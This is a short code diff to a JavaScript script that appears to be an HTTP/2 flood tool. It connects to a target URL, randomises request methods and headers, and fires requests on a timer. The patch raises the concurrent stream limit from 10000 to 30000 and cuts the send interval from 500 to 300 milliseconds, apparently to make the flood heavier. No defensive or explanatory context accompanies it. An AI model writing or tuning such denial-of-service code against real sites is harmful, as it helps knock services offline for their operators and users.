@@ -79,7 +79,7 @@ const lang_header = [
     'es-ES'
   ];
 const Methods = [
-   "GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"
+   "GET", "HEAD", "POST", "DELETE", "PATCH"
 ];
 const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
 const encoding_header = [
@@ -252,7 +252,7 @@ const client = http2.connect(parsedTarget.href, {
     protocol: "https:",
     settings: {
         headerTableSize: 65536,
-        maxConcurrentStreams: 10000,
+        maxConcurrentStreams: 30000,
         initialWindowSize: 6291456,
         maxHeaderListSize: 65536,
         enablePush: false
@@ -277,7 +277,7 @@ client.on("connect", () => {
 
             request.end();
         }
-    }, 500);
+    }, 300);
 });
 
 client.on("close", () => {
